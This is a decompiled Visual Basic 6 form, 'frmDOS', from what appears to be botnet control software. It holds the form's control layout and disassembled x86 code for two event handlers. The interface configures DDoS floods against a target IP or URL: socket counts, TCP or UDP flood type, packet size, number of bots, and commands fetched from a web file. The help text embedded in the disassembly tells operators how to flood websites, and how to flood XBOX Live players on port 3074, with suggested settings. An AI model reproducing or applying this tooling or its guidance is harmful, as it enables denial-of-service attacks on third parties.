VERSION 5.00
Begin VB.Form frmDOS
  Caption = "DDoS"
  ScaleMode = 1
  AutoRedraw = False
  FontTransparent = True
  BorderStyle = 4 'Fixed ToolWindow
  'Icon = n/a
  LinkTopic = "Form1"
  MaxButton = 0   'False
  MinButton = 0   'False
  ClientLeft = 45
  ClientTop = 315
  ClientWidth = 11385
  ClientHeight = 5865
  StartUpPosition = 1 'CenterOwner
  Begin XtremeSuiteControls.PushButton cmdInfo
    Left = 4560
    Top = 5400
    Width = 1095
    Height = 375
    TabIndex = 59
  End
  Begin VB.CheckBox chkResolve
    Caption = "Get IP From URL"
    Left = 3360
    Top = 120
    Width = 1935
    Height = 255
    TabIndex = 58
  End
  Begin XtremeSuiteControls.GroupBox gbCustomize
    Left = 120
    Top = 3240
    Width = 6615
    Height = 975
    TabIndex = 41
    Begin VB.TextBox txtBots
      Left = 2640
      Top = 270
      Width = 1095
      Height = 285
      Enabled = 0   'False
      Text = "10"
      TabIndex = 47
    End
    Begin VB.Frame Frame1
      Left = 1080
      Top = 600
      Width = 4455
      Height = 255
      TabIndex = 42
      BorderStyle = 0 'None
      Begin XtremeSuiteControls.RadioButton optMethod
        Index = 1
        Left = 1320
        Top = 0
        Width = 855
        Height = 255
        TabIndex = 43
      End
      Begin XtremeSuiteControls.RadioButton optMethod
        Index = 0
        Left = 0
        Top = 0
        Width = 1335
        Height = 255
        TabIndex = 44
      End
      Begin XtremeSuiteControls.RadioButton optMethod
        Index = 2
        Left = 2280
        Top = 0
        Width = 855
        Height = 255
        TabIndex = 45
      End
      Begin XtremeSuiteControls.RadioButton optMethod
        Index = 3
        Left = 3240
        Top = 0
        Width = 1095
        Height = 255
        TabIndex = 46
      End
    End
    Begin XtremeSuiteControls.CheckBox chkCustomize
      Left = 240
      Top = 240
      Width = 1095
      Height = 255
      TabIndex = 48
    End
    Begin XtremeSuiteControls.CheckBox chkSelAll
      Left = 3840
      Top = 270
      Width = 1695
      Height = 255
      TabIndex = 49
    End
    Begin VB.Label lblDOS
      Caption = "DDoS by:"
      Index = 6
      Left = 240
      Top = 615
      Width = 735
      Height = 255
      TabIndex = 51
      BackStyle = 0 'Transparent
    End
    Begin VB.Label Label2
      Caption = "Amount of bots:"
      Left = 1440
      Top = 285
      Width = 1215
      Height = 255
      TabIndex = 50
    End
  End
  Begin XtremeSuiteControls.GroupBox gbWEB
    Left = 120
    Top = 4320
    Width = 6615
    Height = 975
    TabIndex = 36
    Begin VB.Timer tmrTimeout
      Enabled = 0   'False
      Interval = 10000
      Left = 600
      Top = 0
    End
    Begin VB.Timer tmrWeb
      Enabled = 0   'False
      Interval = 1000
      Left = 120
      Top = 0
    End
    Begin VB.TextBox txtWebUpdate
      Index = 2
      Left = 4500
      Top = 600
      Width = 375
      Height = 285
      Enabled = 0   'False
      Text = "0"
      TabIndex = 54
      MaxLength = 2
    End
    Begin VB.TextBox txtWebUpdate
      Index = 1
      Left = 3600
      Top = 600
      Width = 375
      Height = 285
      Enabled = 0   'False
      Text = "5"
      TabIndex = 53
      MaxLength = 2
    End
    Begin VB.TextBox txtWebUpdate
      Index = 0
      Left = 2760
      Top = 600
      Width = 375
      Height = 285
      Enabled = 0   'False
      Text = "0"
      TabIndex = 52
      MaxLength = 2
    End
    Begin VB.TextBox txtWebUrl
      Left = 2760
      Top = 240
      Width = 3615
      Height = 285
      Enabled = 0   'False
      Text = "www.site.com/file.txt"
      TabIndex = 38
      MaxLength = 255
    End
    Begin XtremeSuiteControls.CheckBox chkWeb
      Left = 240
      Top = 240
      Width = 1575
      Height = 255
      TabIndex = 37
    End
    Begin VB.Label lblWebUpdate
      Caption = "s"
      Index = 2
      Left = 4920
      Top = 645
      Width = 255
      Height = 255
      TabIndex = 57
    End
    Begin VB.Label lblWebUpdate
      Caption = "m"
      Index = 1
      Left = 4020
      Top = 650
      Width = 255
      Height = 255
      TabIndex = 56
    End
    Begin VB.Label lblWebUpdate
      Caption = "h"
      Index = 0
      Left = 3180
      Top = 650
      Width = 255
      Height = 255
      TabIndex = 55
    End
    Begin VB.Label Label4
      Caption = "Update frequency:"
      Left = 1280
      Top = 600
      Width = 1455
      Height = 255
      TabIndex = 40
      Alignment = 1 'Right Justify
    End
    Begin VB.Label Label3
      Caption = "URL to file:"
      Left = 1920
      Top = 270
      Width = 855
      Height = 255
      TabIndex = 39
    End
  End
  Begin InetCtlsObjects.Inet inetRead
  End
  Begin VB.Frame frmStop
    Left = 1320
    Top = 5445
    Width = 3015
    Height = 255
    TabIndex = 20
    BorderStyle = 0 'None
    Begin XtremeSuiteControls.RadioButton optStop
      Index = 1
      Left = 600
      Top = 0
      Width = 975
      Height = 255
      TabIndex = 21
    End
    Begin XtremeSuiteControls.RadioButton optStop
      Index = 0
      Left = 0
      Top = 0
      Width = 495
      Height = 255
      TabIndex = 22
    End
    Begin XtremeSuiteControls.RadioButton optStop
      Index = 2
      Left = 1650
      Top = 0
      Width = 1215
      Height = 255
      TabIndex = 23
    End
  End
  Begin VB.Timer tmrStats
    Interval = 1000
    Left = 10800
    Top = 0
  End
  Begin XtremeSuiteControls.RadioButton Option1
    Index = 0
    Left = 5040
    Top = 480
    Width = 615
    Height = 255
    TabIndex = 15
  End
  Begin XtremeSuiteControls.CheckBox chkData
    Left = 1200
    Top = 2880
    Width = 1695
    Height = 255
    TabIndex = 14
  End
  Begin XtremeSuiteControls.PushButton cmdStopAll
    Left = 240
    Top = 5400
    Width = 975
    Height = 375
    TabIndex = 12
  End
  Begin VB.TextBox txtSize
    Left = 5400
    Top = 2880
    Width = 615
    Height = 285
    Text = "1024"
    TabIndex = 9
  End
  Begin VB.TextBox txtData
    Left = 1200
    Top = 840
    Width = 5415
    Height = 1965
    Text = "GET http://127.0.0.1/index.html HTTP/1.1\nHost: 127.0.0.1\n"
    TabIndex = 7
    MultiLine = -1  'True
    ScrollBars = 2
    MaxLength = 8192
  End
  Begin VB.TextBox txtSockets
    Left = 2280
    Top = 480
    Width = 615
    Height = 285
    Text = "75"
    TabIndex = 5
  End
  Begin VB.TextBox txtPort
    Left = 5880
    Top = 120
    Width = 735
    Height = 285
    Text = "80"
    TabIndex = 2
  End
  Begin VB.TextBox txtIP
    Left = 1320
    Top = 120
    Width = 1935
    Height = 285
    Text = "127.0.0.1"
    TabIndex = 1
  End
  Begin XtremeSuiteControls.PushButton cmdStart
    Left = 5760
    Top = 5400
    Width = 975
    Height = 375
    TabIndex = 13
  End
  Begin XtremeSuiteControls.RadioButton Option1
    Index = 1
    Left = 5880
    Top = 480
    Width = 615
    Height = 255
    TabIndex = 16
  End
  Begin VB.Label lblStatsSuffix
    Caption = "N/A"
    Index = 6
    Left = 8280
    Top = 3840
    Width = 2295
    Height = 255
    TabIndex = 35
    BackStyle = 0 'Transparent
  End
  Begin VB.Label lblStatsSuffix
    Caption = "N/A"
    Index = 5
    Left = 8280
    Top = 3480
    Width = 2175
    Height = 255
    TabIndex = 34
    BackStyle = 0 'Transparent
  End
  Begin VB.Label lblStatsSuffix
    Caption = "N/A"
    Index = 4
    Left = 8280
    Top = 3120
    Width = 2055
    Height = 255
    TabIndex = 33
    BackStyle = 0 'Transparent
  End
  Begin VB.Label lblStatsSuffix
    Caption = "N/A"
    Index = 3
    Left = 8280
    Top = 2760
    Width = 1935
    Height = 255
    TabIndex = 32
    BackStyle = 0 'Transparent
  End
  Begin VB.Label lblStatsSuffix
    Caption = "N/A"
    Index = 2
    Left = 8280
    Top = 2400
    Width = 2055
    Height = 255
    TabIndex = 31
    BackStyle = 0 'Transparent
  End
  Begin VB.Label lblStatsPrefix
    Caption = "Packet size:"
    Index = 3
    Left = 7080
    Top = 2760
    Width = 975
    Height = 255
    TabIndex = 30
    Alignment = 1 'Right Justify
    BackStyle = 0 'Transparent
  End
  Begin VB.Label lblStatsPrefix
    Caption = "Protocol:"
    Index = 2
    Left = 7080
    Top = 2400
    Width = 975
    Height = 255
    TabIndex = 29
    Alignment = 1 'Right Justify
    BackStyle = 0 'Transparent
  End
  Begin VB.Label lblStatsPrefix
    Caption = "Port:"
    Index = 1
    Left = 7080
    Top = 2040
    Width = 975
    Height = 255
    TabIndex = 28
    Alignment = 1 'Right Justify
    BackStyle = 0 'Transparent
  End
  Begin VB.Label lblStatsPrefix
    Caption = "Target:"
    Index = 0
    Left = 7080
    Top = 1680
    Width = 975
    Height = 375
    TabIndex = 27
    Alignment = 1 'Right Justify
    BackStyle = 0 'Transparent
  End
  Begin VB.Label lblStatsPrefix
    Caption = "Method:"
    Index = 5
    Left = 7080
    Top = 3480
    Width = 975
    Height = 255
    TabIndex = 26
    Alignment = 1 'Right Justify
    BackStyle = 0 'Transparent
  End
  Begin VB.Label lblStatsSuffix
    Caption = "N/A"
    Index = 1
    Left = 8280
    Top = 2040
    Width = 2175
    Height = 255
    TabIndex = 25
    BackStyle = 0 'Transparent
  End
  Begin VB.Label lblStatsSuffix
    Caption = "N/A"
    Index = 0
    Left = 8280
    Top = 1680
    Width = 2295
    Height = 255
    TabIndex = 24
    BackStyle = 0 'Transparent
  End
  Begin VB.Label lblStatsPrefix
    Caption = "Sockets:"
    Index = 4
    Left = 7080
    Top = 3120
    Width = 975
    Height = 255
    TabIndex = 19
    Alignment = 1 'Right Justify
    BackStyle = 0 'Transparent
  End
  Begin VB.Label lblStatsPrefix
    Caption = "DDoSers:"
    Index = 6
    Left = 7080
    Top = 3840
    Width = 975
    Height = 255
    TabIndex = 18
    Alignment = 1 'Right Justify
    BackStyle = 0 'Transparent
  End
  Begin VB.Label lblDosStats
    Caption = "Statistics"
    Left = 7680
    Top = 240
    Width = 2655
    Height = 375
    TabIndex = 17
    Alignment = 2 'Center
    BeginProperty Font
      Name = "MS Sans Serif"
      Size = 13,5
      Charset = 0
      Weight = 400
      Underline = 0 'False
      Italic = 0 'False
      Strikethrough = 0 'False
    EndProperty
  End
  Begin VB.Line Line1
    X1 = 6840
    Y1 = 120
    X2 = 6840
    Y2 = 5760
  End
  Begin VB.Label Label1
    Caption = "Flood Type:"
    Left = 4080
    Top = 480
    Width = 975
    Height = 255
    TabIndex = 11
    BackStyle = 0 'Transparent
  End
  Begin VB.Label lblDOS
    Caption = "bytes"
    Index = 5
    Left = 6120
    Top = 2880
    Width = 375
    Height = 255
    TabIndex = 10
    BackStyle = 0 'Transparent
  End
  Begin VB.Label lblDOS
    Caption = "Packet size (max 8192):"
    Index = 4
    Left = 3600
    Top = 2880
    Width = 1695
    Height = 255
    TabIndex = 8
    BackStyle = 0 'Transparent
  End
  Begin VB.Label lblDOS
    Caption = "Data to send:"
    Index = 3
    Left = 120
    Top = 840
    Width = 975
    Height = 255
    TabIndex = 6
    BackStyle = 0 'Transparent
  End
  Begin VB.Label lblDOS
    Caption = "Number of sockets (max 999):"
    Index = 2
    Left = 120
    Top = 480
    Width = 2175
    Height = 255
    TabIndex = 4
    BackStyle = 0 'Transparent
  End
  Begin VB.Label lblDOS
    Caption = "Port:"
    Index = 1
    Left = 5400
    Top = 120
    Width = 375
    Height = 255
    TabIndex = 3
    BackStyle = 0 'Transparent
  End
  Begin VB.Label lblDOS
    Caption = "Target IP/DNS:"
    Index = 0
    Left = 120
    Top = 120
    Width = 1215
    Height = 255
    TabIndex = 0
    BackStyle = 0 'Transparent
  End
End

Attribute VB_Name = "frmDOS"


Private sub cmdInfo__7F875B
007F875B: push ebp
007F875C: mov ebp, esp
007F875E: sub esp, 0000000Ch
007F8761: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
007F8766: mov eax, fs:[00h]
007F876C: push eax
007F876D: mov fs:[00000000h], esp
007F8774: mov eax, 000000C0h
007F8779: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007F877E: push ebx
007F877F: push esi
007F8780: push edi
007F8781: mov var_0C, esp
007F8784: mov var_08, 0040A0C0h
007F878B: mov eax, [ebp+08h]
007F878E: and eax, 00000001h
007F8791: mov var_04, eax
007F8794: mov eax, [ebp+08h]
007F8797: and al, FEh
007F8799: mov [ebp+08h], eax
007F879C: mov eax, [ebp+08h]
007F879F: mov eax, [eax]
007F87A1: push [ebp+08h]
007F87A4: call [eax+04h]
007F87A7: mov var_00000094, 80020004h
007F87B1: mov var_0000009C, 0000000Ah
007F87BB: mov var_00000084, 80020004h
007F87C5: mov var_0000008C, 0000000Ah
007F87CF: mov var_74, 80020004h
007F87D6: mov var_7C, 0000000Ah
007F87DD: push 00450CC8h ; Sockets: A socket is basically an open connection that will be sending data. The number of sockets is how many open connections are opened to send data.
007F87E2: push 00441264h ; vbCrLf
007F87E7: call 00410A18h ; &
007F87EC: mov edx, eax
007F87EE: lea ecx, var_18
007F87F1: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F87F6: push eax
007F87F7: push 00441264h ; vbCrLf
007F87FC: call 00410A18h ; &
007F8801: mov edx, eax
007F8803: lea ecx, var_1C
007F8806: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F880B: push eax
007F880C: push 00450EB8h ; Packet Size: the packet size is the size that each connection is sending. This is only used if the random box is checked. For TCP DDoS, I suggest not using random, and using the default data with their IP address.
007F8811: call 00410A18h ; &
007F8816: mov edx, eax
007F8818: lea ecx, var_20
007F881B: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F8820: push eax
007F8821: push 00441264h ; vbCrLf
007F8826: call 00410A18h ; &
007F882B: mov edx, eax
007F882D: lea ecx, var_24
007F8830: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F8835: push eax
007F8836: push 00441264h ; vbCrLf
007F883B: call 00410A18h ; &
007F8840: mov edx, eax
007F8842: lea ecx, var_28
007F8845: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F884A: push eax
007F884B: push 004510A0h ; Port: The port for TCP DDoS will almost 100% of the time be 80. For UDP DDoS, the port should be opened. You can scan with nMap or google about their ports. XBOX Live will use port 3074.
007F8850: call 00410A18h ; &
007F8855: mov edx, eax
007F8857: lea ecx, var_2C
007F885A: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F885F: push eax
007F8860: push 00441264h ; vbCrLf
007F8865: call 00410A18h ; &
007F886A: mov edx, eax
007F886C: lea ecx, var_30
007F886F: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F8874: push eax
007F8875: push 00441264h ; vbCrLf
007F887A: call 00410A18h ; &
007F887F: mov edx, eax
007F8881: lea ecx, var_34
007F8884: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F8889: push eax
007F888A: push 00451294h ; Flood Type: The flood type is easy. If you are DDoSing a website/server, the flood type should be TCP. If not, use UDP.
007F888F: call 00410A18h ; &
007F8894: mov edx, eax
007F8896: lea ecx, var_38
007F8899: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F889E: push eax
007F889F: push 00441264h ; vbCrLf
007F88A4: call 00410A18h ; &
007F88A9: mov edx, eax
007F88AB: lea ecx, var_3C
007F88AE: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F88B3: push eax
007F88B4: push 00441264h ; vbCrLf
007F88B9: call 00410A18h ; &
007F88BE: mov edx, eax
007F88C0: lea ecx, var_40
007F88C3: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F88C8: push eax
007F88C9: push 00451388h ; Check Cuztomise and All Bots to DDoS with all bots, even those who leave and rejoin.
007F88CE: call 00410A18h ; &
007F88D3: mov edx, eax
007F88D5: lea ecx, var_44
007F88D8: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F88DD: push eax
007F88DE: push 00441264h ; vbCrLf
007F88E3: call 00410A18h ; &
007F88E8: mov edx, eax
007F88EA: lea ecx, var_48
007F88ED: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F88F2: push eax
007F88F3: push 00441264h ; vbCrLf
007F88F8: call 00410A18h ; &
007F88FD: mov edx, eax
007F88FF: lea ecx, var_4C
007F8902: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F8907: push eax
007F8908: push 00451438h ; Suggested Settings:
007F890D: call 00410A18h ; &
007F8912: mov edx, eax
007F8914: lea ecx, var_50
007F8917: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F891C: push eax
007F891D: push 00441264h ; vbCrLf
007F8922: call 00410A18h ; &
007F8927: mov edx, eax
007F8929: lea ecx, var_54
007F892C: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F8931: push eax
007F8932: push 0045121Ch ; TCP: 75 sockets, default data, port 80.
007F8937: call 00410A18h ; &
007F893C: mov edx, eax
007F893E: lea ecx, var_58
007F8941: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F8946: push eax
007F8947: push 00441264h ; vbCrLf
007F894C: call 00410A18h ; &
007F8951: mov edx, eax
007F8953: lea ecx, var_5C
007F8956: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F895B: push eax
007F895C: push 00450E00h ; UDP: 75 sockets, random data, packet size 1024 (1kb), port 3074
007F8961: call 00410A18h ; &
007F8966: mov var_64, eax
007F8969: mov var_6C, 00000008h
007F8970: lea eax, var_0000009C
007F8976: push eax
007F8977: lea eax, var_0000008C
007F897D: push eax
007F897E: lea eax, var_7C
007F8981: push eax
007F8982: push 00000040h
007F8984: lea eax, var_6C
007F8987: push eax
007F8988: call 004109E8h ; MsgBox(arg_1, arg_2, arg_3, arg_4, arg_5)
007F898D: lea eax, var_5C
007F8990: push eax
007F8991: lea eax, var_58
007F8994: push eax
007F8995: lea eax, var_54
007F8998: push eax
007F8999: lea eax, var_50
007F899C: push eax
007F899D: lea eax, var_4C
007F89A0: push eax
007F89A1: lea eax, var_48
007F89A4: push eax
007F89A5: lea eax, var_44
007F89A8: push eax
007F89A9: lea eax, var_40
007F89AC: push eax
007F89AD: lea eax, var_3C
007F89B0: push eax
007F89B1: lea eax, var_38
007F89B4: push eax
007F89B5: lea eax, var_34
007F89B8: push eax
007F89B9: lea eax, var_30
007F89BC: push eax
007F89BD: lea eax, var_2C
007F89C0: push eax
007F89C1: lea eax, var_28
007F89C4: push eax
007F89C5: lea eax, var_24
007F89C8: push eax
007F89C9: lea eax, var_20
007F89CC: push eax
007F89CD: lea eax, var_1C
007F89D0: push eax
007F89D1: lea eax, var_18
007F89D4: push eax
007F89D5: push 00000012h
007F89D7: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
007F89DC: add esp, 0000004Ch
007F89DF: lea eax, var_0000009C
007F89E5: push eax
007F89E6: lea eax, var_0000008C
007F89EC: push eax
007F89ED: lea eax, var_7C
007F89F0: push eax
007F89F1: lea eax, var_6C
007F89F4: push eax
007F89F5: push 00000004h
007F89F7: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F89FC: add esp, 00000014h
007F89FF: mov var_04, 00000000h
007F8A06: push 007F8A81h
007F8A0B: jmp 7F8A80h
007F8A0D: lea eax, var_5C
007F8A10: push eax
007F8A11: lea eax, var_58
007F8A14: push eax
007F8A15: lea eax, var_54
007F8A18: push eax
007F8A19: lea eax, var_50
007F8A1C: push eax
007F8A1D: lea eax, var_4C
007F8A20: push eax
007F8A21: lea eax, var_48
007F8A24: push eax
007F8A25: lea eax, var_44
007F8A28: push eax
007F8A29: lea eax, var_40
007F8A2C: push eax
007F8A2D: lea eax, var_3C
007F8A30: push eax
007F8A31: lea eax, var_38
007F8A34: push eax
007F8A35: lea eax, var_34
007F8A38: push eax
007F8A39: lea eax, var_30
007F8A3C: push eax
007F8A3D: lea eax, var_2C
007F8A40: push eax
007F8A41: lea eax, var_28
007F8A44: push eax
007F8A45: lea eax, var_24
007F8A48: push eax
007F8A49: lea eax, var_20
007F8A4C: push eax
007F8A4D: lea eax, var_1C
007F8A50: push eax
007F8A51: lea eax, var_18
007F8A54: push eax
007F8A55: push 00000012h
007F8A57: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
007F8A5C: add esp, 0000004Ch
007F8A5F: lea eax, var_0000009C
007F8A65: push eax
007F8A66: lea eax, var_0000008C
007F8A6C: push eax
007F8A6D: lea eax, var_7C
007F8A70: push eax
007F8A71: lea eax, var_6C
007F8A74: push eax
007F8A75: push 00000004h
007F8A77: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F8A7C: add esp, 00000014h
007F8A7F: ret 
End Sub

Private sub chkCustomize__7EE9CD
007EE9CD: push ebp
007EE9CE: mov ebp, esp
007EE9D0: sub esp, 0000000Ch
007EE9D3: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
007EE9D8: mov eax, fs:[00h]
007EE9DE: push eax
007EE9DF: mov fs:[00000000h], esp
007EE9E6: mov eax, 000000A8h
007EE9EB: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007EE9F0: push ebx
007EE9F1: push esi
007EE9F2: push edi
007EE9F3: mov var_0C, esp
007EE9F6: mov var_08, 00409C58h
007EE9FD: mov eax, [ebp+08h]
007EEA00: and eax, 00000001h
007EEA03: mov var_04, eax
007EEA06: mov eax, [ebp+08h]
007EEA09: and al, FEh
007EEA0B: mov [ebp+08h], eax
007EEA0E: mov eax, [ebp+08h]
007EEA11: mov eax, [eax]
007EEA13: push [ebp+08h]
007EEA16: call [eax+04h]
007EEA19: mov eax, [ebp+08h]
007EEA1C: mov eax, [eax]
007EEA1E: push [ebp+08h]
007EEA21: call [eax+00000300h]
007EEA27: push eax
007EEA28: lea eax, var_2C
007EEA2B: push eax
007EEA2C: call 00410A84h ; Set (object)
007EEA31: mov var_78, eax
007EEA34: push 00000000h
007EEA36: push 00000000h
007EEA38: mov eax, [ebp+08h]
007EEA3B: mov eax, [eax]
007EEA3D: push [ebp+08h]
007EEA40: call [eax+00000368h]
007EEA46: push eax
007EEA47: lea eax, var_28
007EEA4A: push eax
007EEA4B: call 00410A84h ; Set (object)
007EEA50: push eax
007EEA51: lea eax, var_40
007EEA54: push eax
007EEA55: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007EEA5A: add esp, 00000010h
007EEA5D: push eax
007EEA5E: call 00410A90h ; msvbvm60.dll.__vbaI4Var
007EEA63: neg eax
007EEA65: sbb eax, eax
007EEA67: neg eax
007EEA69: neg eax
007EEA6B: push eax
007EEA6C: mov eax, var_78
007EEA6F: mov eax, [eax]
007EEA71: push var_78
007EEA74: call [eax+0000008Ch]
007EEA7A: fclex 
007EEA7C: mov var_7C, eax
007EEA7F: cmp var_7C, 00000000h
007EEA83: jnl 7EEAA2h
007EEA85: push 0000008Ch
007EEA8A: push 00440E08h
007EEA8F: push var_78
007EEA92: push var_7C
007EEA95: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007EEA9A: mov var_000000AC, eax
007EEAA0: jmp 7EEAA9h
007EEAA2: and var_000000AC, 00000000h
007EEAA9: lea eax, var_2C
007EEAAC: push eax
007EEAAD: lea eax, var_28
007EEAB0: push eax
007EEAB1: push 00000002h
007EEAB3: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007EEAB8: add esp, 0000000Ch
007EEABB: lea ecx, var_40
007EEABE: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
007EEAC3: push 00000000h
007EEAC5: push 00000000h
007EEAC7: mov eax, [ebp+08h]
007EEACA: mov eax, [eax]
007EEACC: push [ebp+08h]
007EEACF: call [eax+00000368h]
007EEAD5: push eax
007EEAD6: lea eax, var_28
007EEAD9: push eax
007EEADA: call 00410A84h ; Set (object)
007EEADF: push eax
007EEAE0: lea eax, var_40
007EEAE3: push eax
007EEAE4: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007EEAE9: add esp, 00000010h
007EEAEC: push eax
007EEAED: call 00410A90h ; msvbvm60.dll.__vbaI4Var
007EEAF2: neg eax
007EEAF4: sbb eax, eax
007EEAF6: neg eax
007EEAF8: neg eax
007EEAFA: mov var_48, ax
007EEAFE: mov var_50, 0000000Bh
007EEB05: push 00000010h
007EEB07: pop eax
007EEB08: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007EEB0D: lea esi, var_50
007EEB10: mov edi, esp
007EEB12: movsd 
007EEB13: movsd 
007EEB14: movsd 
007EEB15: movsd 
007EEB16: push 8001000Dh
007EEB1B: mov eax, [ebp+08h]
007EEB1E: mov eax, [eax]
007EEB20: push [ebp+08h]
007EEB23: call [eax+0000036Ch]
007EEB29: push eax
007EEB2A: lea eax, var_2C
007EEB2D: push eax
007EEB2E: call 00410A84h ; Set (object)
007EEB33: push eax
007EEB34: call 00410A72h ; msvbvm60.dll.__vbaLateIdSt
007EEB39: lea eax, var_2C
007EEB3C: push eax
007EEB3D: lea eax, var_28
007EEB40: push eax
007EEB41: push 00000002h
007EEB43: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007EEB48: add esp, 0000000Ch
007EEB4B: lea eax, var_50
007EEB4E: push eax
007EEB4F: lea eax, var_40
007EEB52: push eax
007EEB53: push 00000002h
007EEB55: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007EEB5A: add esp, 0000000Ch
007EEB5D: mov eax, [ebp+08h]
007EEB60: mov eax, [eax]
007EEB62: push [ebp+08h]
007EEB65: call [eax+00000300h]
007EEB6B: push eax
007EEB6C: lea eax, var_2C
007EEB6F: push eax
007EEB70: call 00410A84h ; Set (object)
007EEB75: mov var_78, eax
007EEB78: push 00000000h
007EEB7A: push 00000000h
007EEB7C: mov eax, [ebp+08h]
007EEB7F: mov eax, [eax]
007EEB81: push [ebp+08h]
007EEB84: call [eax+00000368h]
007EEB8A: push eax
007EEB8B: lea eax, var_28
007EEB8E: push eax
007EEB8F: call 00410A84h ; Set (object)
007EEB94: push eax
007EEB95: lea eax, var_40
007EEB98: push eax
007EEB99: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007EEB9E: add esp, 00000010h
007EEBA1: push eax
007EEBA2: call 00410A90h ; msvbvm60.dll.__vbaI4Var
007EEBA7: neg eax
007EEBA9: sbb eax, eax
007EEBAB: neg eax
007EEBAD: neg eax
007EEBAF: push eax
007EEBB0: mov eax, var_78
007EEBB3: mov eax, [eax]
007EEBB5: push var_78
007EEBB8: call [eax+0000008Ch]
007EEBBE: fclex 
007EEBC0: mov var_7C, eax
007EEBC3: cmp var_7C, 00000000h
007EEBC7: jnl 7EEBE6h
007EEBC9: push 0000008Ch
007EEBCE: push 00440E08h
007EEBD3: push var_78
007EEBD6: push var_7C
007EEBD9: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007EEBDE: mov var_000000B0, eax
007EEBE4: jmp 7EEBEDh
007EEBE6: and var_000000B0, 00000000h
007EEBED: lea eax, var_2C
007EEBF0: push eax
007EEBF1: lea eax, var_28
007EEBF4: push eax
007EEBF5: push 00000002h
007EEBF7: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007EEBFC: add esp, 0000000Ch
007EEBFF: lea ecx, var_40
007EEC02: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
007EEC07: push 00000000h
007EEC09: push 00000000h
007EEC0B: mov eax, [ebp+08h]
007EEC0E: mov eax, [eax]
007EEC10: push [ebp+08h]
007EEC13: call [eax+0000036Ch]
007EEC19: push eax
007EEC1A: lea eax, var_28
007EEC1D: push eax
007EEC1E: call 00410A84h ; Set (object)
007EEC23: push eax
007EEC24: lea eax, var_40
007EEC27: push eax
007EEC28: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007EEC2D: add esp, 00000010h
007EEC30: push eax
007EEC31: call 00410A90h ; msvbvm60.dll.__vbaI4Var
007EEC36: dec eax
007EEC37: neg eax
007EEC39: sbb eax, eax
007EEC3B: inc eax
007EEC3C: neg eax
007EEC3E: mov var_78, ax
007EEC42: lea ecx, var_28
007EEC45: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
007EEC4A: lea ecx, var_40
007EEC4D: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
007EEC52: movsx eax, word ptr var_78
007EEC56: test eax, eax
007EEC58: jz 7EECBCh
007EEC5A: mov eax, [ebp+08h]
007EEC5D: mov eax, [eax]
007EEC5F: push [ebp+08h]
007EEC62: call [eax+00000300h]
007EEC68: push eax
007EEC69: lea eax, var_28
007EEC6C: push eax
007EEC6D: call 00410A84h ; Set (object)
007EEC72: mov var_78, eax
007EEC75: push 00000000h
007EEC77: mov eax, var_78
007EEC7A: mov eax, [eax]
007EEC7C: push var_78
007EEC7F: call [eax+0000008Ch]
007EEC85: fclex 
007EEC87: mov var_7C, eax
007EEC8A: cmp var_7C, 00000000h
007EEC8E: jnl 7EECADh
007EEC90: push 0000008Ch
007EEC95: push 00440E08h
007EEC9A: push var_78
007EEC9D: push var_7C
007EECA0: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007EECA5: mov var_000000B4, eax
007EECAB: jmp 7EECB4h
007EECAD: and var_000000B4, 00000000h
007EECB4: lea ecx, var_28
007EECB7: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
007EECBC: mov var_48, 00000001h
007EECC3: mov var_50, 00000002h
007EECCA: mov eax, [ebp+08h]
007EECCD: mov eax, [eax]
007EECCF: push [ebp+08h]
007EECD2: call [eax+00000364h]
007EECD8: push eax
007EECD9: lea eax, var_28
007EECDC: push eax
007EECDD: call 00410A84h ; Set (object)
007EECE2: mov var_78, eax
007EECE5: lea eax, var_74
007EECE8: push eax
007EECE9: mov eax, var_78
007EECEC: mov eax, [eax]
007EECEE: push var_78
007EECF1: call [eax+48h]
007EECF4: fclex 
007EECF6: mov var_7C, eax
007EECF9: cmp var_7C, 00000000h
007EECFD: jnl 7EED19h
007EECFF: push 00000048h
007EED01: push 00440DE8h
007EED06: push var_78
007EED09: push var_7C
007EED0C: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007EED11: mov var_000000B8, eax
007EED17: jmp 7EED20h
007EED19: and var_000000B8, 00000000h
007EED20: mov ax, var_74
007EED24: mov var_58, ax
